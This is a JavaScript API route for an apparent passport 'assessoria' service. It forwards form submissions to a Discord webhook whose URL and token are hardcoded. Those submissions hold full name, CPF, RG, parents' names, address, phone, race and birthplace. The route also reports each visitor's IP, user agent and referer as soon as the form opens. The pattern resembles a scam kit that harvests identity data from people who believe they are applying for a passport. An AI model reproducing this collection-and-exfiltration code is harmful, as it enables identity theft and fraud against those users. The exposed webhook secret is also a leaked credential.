// API Route para enviar notificacoes ao Discord via webhook
// Mantemos a URL do webhook no servidor para nao expor ao cliente.
// Pode ser sobrescrita pela variavel de ambiente DISCORD_WEBHOOK_URL.

const DEFAULT_WEBHOOK = 'https://discord.com/api/webhooks/1494828785059631276/ZBryBQHJu2wpuCVV74GURSAWaSULatWO0jpEYaaQegRlWp5CcFLJj9mz1exhHi2ai8XO';

// Mapeia nomes internos de campos para labels mais amigaveis
const FIELD_LABELS = {
    nomeCompleto: 'Nome Completo',
    sexo: 'Sexo',
    dataNascimento: 'Data Nascimento',
    cpf: 'CPF',
    identidadeNumero: 'RG',
    identidadeOrgaoEmissor: 'Orgao Emissor',
    identidadeUfExpedicao: 'UF RG',
    identidadeDataEmissao: 'Emissao RG',
    nomeGenitor1: 'Pai/Mae 1',
    nomeGenitor2: 'Pai/Mae 2',
    enderecoEletronico: 'E-mail',
    ddd: 'DDD',
    telefone: 'Telefone',
    cep: 'CEP',
    enderecoResidencia: 'Endereco',
    bairro: 'Bairro',
    cidadeResidencia: 'Cidade',
    ufResidencia: 'UF',
    paisResidencia: 'Pais',
    profissao: 'Profissao',
    estadoCivil: 'Estado Civil',
    racaCor: 'Raca/Cor',
    ufNascimento: 'UF Nascimento',
    cidadeNascimento: 'Cidade Nascimento'
};

// Campos prioritarios (ordem no embed)
const PRIORITY_FIELDS = [
    'nomeCompleto', 'cpf', 'dataNascimento', 'sexo',
    'enderecoEletronico', 'ddd', 'telefone',
    'cep', 'enderecoResidencia', 'bairro', 'cidadeResidencia', 'ufResidencia',
    'identidadeNumero', 'identidadeOrgaoEmissor', 'identidadeUfExpedicao',
    'nomeGenitor1', 'nomeGenitor2',
    'profissao', 'estadoCivil', 'racaCor',
    'ufNascimento', 'cidadeNascimento'
];

// Campos sensiveis/irrelevantes a remover do payload
const SKIP_FIELDS = new Set([
    'dispatch', 'validate', 'validaCaptcha',
    'outrasNacionalidadesString', 'nomesAnterioresString',
    'email1', 'email2', 'checkConfirma', 'confirmacaoEnderecoEletronico'
]);

function truncate(value, max) {
    if (value === undefined || value === null) return '';
    var s = String(value);
    if (s.length <= max) return s;
    return s.substring(0, max - 3) + '...';
}

function buildFieldsFromData(data) {
    if (!data || typeof data !== 'object') return [];
    var fields = [];
    var added = new Set();

    // Primeiro: campos prioritarios
    PRIORITY_FIELDS.forEach(function(key) {
        if (data[key] && String(data[key]).trim() !== '') {
            fields.push({
                name: FIELD_LABELS[key] || key,
                value: truncate(data[key], 1020) || '-',
                inline: true
            });
            added.add(key);
        }
    });

    // Depois: demais campos (ate o limite do Discord: 25 fields)
    Object.keys(data).forEach(function(key) {
        if (added.has(key) || SKIP_FIELDS.has(key)) return;
        var val = data[key];
        if (val === undefined || val === null || String(val).trim() === '') return;
        if (fields.length >= 25) return;
        fields.push({
            name: FIELD_LABELS[key] || key,
            value: truncate(val, 1020),
            inline: true
        });
    });

    return fields;
}

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ success: false, error: 'Metodo nao permitido' });
    }

    var webhookUrl = process.env.DISCORD_WEBHOOK_URL || DEFAULT_WEBHOOK;

    try {
        var body = req.body;
        // Alguns runtimes entregam body como string
        if (typeof body === 'string') {
            try { body = JSON.parse(body); } catch (e) { body = {}; }
        }
        var event = (body && body.event) || '';
        var data = (body && body.data) || {};
        var meta = (body && body.meta) || {};

        var ip = (req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || '')
            .toString()
            .split(',')[0]
            .trim() || 'desconhecido';
        var userAgent = truncate(req.headers['user-agent'] || 'desconhecido', 200);
        var referer = truncate(req.headers.referer || meta.referer || '', 200) || '-';
        var pagina = truncate(meta.page || '', 200) || '-';

        var embed;

        if (event === 'form_started') {
            embed = {
                title: 'Formulario iniciado',
                description: 'Um visitante abriu o formulario de assessoria.',
                color: 0x0b3b6b,
                timestamp: new Date().toISOString(),
                fields: [
                    { name: 'IP', value: ip, inline: true },
                    { name: 'Pagina', value: pagina, inline: true },
                    { name: 'Referer', value: referer, inline: false },
                    { name: 'User-Agent', value: userAgent, inline: false }
                ],
                footer: { text: 'Passaporte Turismo - Assessoria' }
            };
        } else if (event === 'form_submitted') {
            var dataFields = buildFieldsFromData(data);
            var headerFields = [
                { name: 'IP', value: ip, inline: true },
                { name: 'Enviado em', value: new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' }), inline: true }
            ];
            embed = {
                title: 'Formulario preenchido',
                description: 'Um usuario concluiu o preenchimento e foi direcionado para pagamento.',
                color: 0xf59e0b,
                timestamp: new Date().toISOString(),
                fields: headerFields.concat(dataFields).slice(0, 25),
                footer: { text: 'Passaporte Turismo - Assessoria' }
            };
        } else {
            return res.status(400).json({ success: false, error: 'Evento invalido' });
        }

        var payload = { embeds: [embed] };

        var discordResp = await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        if (!discordResp.ok) {
            var errText = await discordResp.text();
            console.log('[v0] Discord webhook falhou:', discordResp.status, errText);
            return res.status(502).json({ success: false, error: 'Discord retornou ' + discordResp.status });
        }

        return res.status(200).json({ success: true });
    } catch (err) {
        console.log('[v0] Erro ao notificar Discord:', err && err.message);
        return res.status(500).json({ success: false, error: (err && err.message) || 'Erro interno' });
    }
}
